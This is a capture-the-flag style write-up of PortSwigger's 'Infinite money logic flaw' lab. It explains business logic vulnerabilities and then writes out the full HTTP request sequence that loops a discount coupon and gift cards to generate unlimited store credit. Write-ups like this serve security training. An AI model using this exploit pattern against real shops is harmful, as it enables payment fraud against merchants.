@@ -1,0 +1,180 @@
+           __________________________________________________
+
+                   INFINITE MONEY WITH BUSINESS LOGIC
+                            VULNERABILITIES
+                              Web Security
+
+                                Hexdump
+           __________________________________________________
+
+
+Table of Contents
+_________________
+
+1. On Business Logic Vulnerabilities
+2. The Challenge
+3. The Solution
+
+
+1 On Business Logic Vulnerabilities
+===================================
+
+  `Business Logic Vulnerabilities' arise within the intersection between
+  computer science and business processes.
+
+  One of the objective of `Computer Science' is to develop and maintain
+  technologies that aim to support one or more business processes.
+
+  When the business logic is not properly implemented, we find a
+  Business Logic Vulnerability. This could mean many different things,
+  depending on the context:
+
+  - Allow a user to perform an action with an invalid "state".
+  - Allow a user to skip a step in a multi-step sequence.
+  - ...
+
+  For example, in the context of an `e-commerce', technology must ensure
+  that all the user flows are protected from malicious usage. Some of
+  the most critical flows:
+  - purchase flow
+  - product lifecycle
+  - order lifecycle
+
+
+2 The Challenge
+===============
+
+  Let's consider the lab "Infinite money logic flaw" taken from the Web
+  Academy of `PortSwigger'.
+
+  ,----
+  | https://portswigger.net/web-security/all-labs
+  | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
+  `----
+
+  The lab implements a simple e-commerce service, where it is possible
+  to login with the `wiener' account.
+  ,----
+  | wiener:peter
+  `----
+
+  The objective of the challenge is to buy an item that costs `1337'
+  money, starting from an account with only `100' money.
+
+
+3 The Solution
+==============
+
+  The vulnerability is to be found in the `purchase flow'.  By sending a
+  specific sequence of HTTP requests, it is possible to generate `3'
+  money.  By repeating this sequence multiple times, it is possible to
+  generate an infinite amount of money.  This allows us to buy the
+  requested item.
+
+  ----------------------------------------------------------------------
+
+  First, notice that by signing up in the newsletter we obtain the
+  following discount code.
+  ,----
+  | SIGNUP30
+  `----
+
+  The item of interest to trigger the vulnerability is the `gift
+    card'. Since it is possible to use the `discount code' to buy the
+    `gift card', it is possible to generate `3' money.
+
+  ,----
+  | Cost of gift card       -10
+  | Discount code           +3
+  | Use gift card           +10
+  | ---------------------------
+  | Total                   +3
+  `----
+
+  By repeating this process a certain number of times, it is possible to
+  obtain the required `1337' money.
+
+  ,----
+  | (/ (- 1337 100) 3)
+  `----
+
+  ----------------------------------------------------------------------
+
+  Specifically, consider the following vulnerable flow of request
+
+  - Add item (`gift card') to the cart
+
+    ,----
+    | POST /cart HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | Content-Length: 36
+    | Content-Type: application/x-www-form-urlencoded
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    | 
+    | productId=2&redir=PRODUCT&quantity=1
+    `----
+
+  - Apply `coupon code' to lower the price
+
+    ,----
+    | POST /cart/coupon HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | Content-Length: 53
+    | Content-Type: application/x-www-form-urlencoded
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    | 
+    | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt&coupon=SIGNUP30
+    `----
+
+  - Buy the `gift card' for `7'
+
+    ,----
+    | POST /cart/checkout HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | Content-Length: 37
+    | Content-Type: application/x-www-form-urlencoded
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    | 
+    | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt
+    `----
+
+  - Complete the checkout to read the gift card
+
+    ,----
+    | GET /cart/order-confirmation?order-confirmed=true HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    `----
+
+  ,----
+  | <table class=is-table-numbers>
+  |   <tbody>
+  |     <tr>
+  |       <th>Code</th>
+  |     </tr>
+  |     <tr>
+  |       <td>fdUtHcJbgi</td>
+  |     </tr>
+  |     <tr>
+  |       <td>4PH5McxW8a</td>
+  |     </tr>
+  |   </tbody>
+  | </table>
+  `----
+
+  - Use the gift card to get back `10'
+
+    ,----
+    | POST /gift-card HTTP/2
+    | Host: 0a4e00a4042dd9928070f9fc0063000c.web-security-academy.net
+    | Cookie: session=winzbHWzJj7cmySa9gGSdc3L213M7wcA
+    | Content-Length: 58
+    | Content-Type: application/x-www-form-urlencoded
+    | User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    | 
+    | csrf=qgfncychfYretoS8u1GTLsEJ22ip7ZQt&gift-card=Z2j92XRifE
+    `----
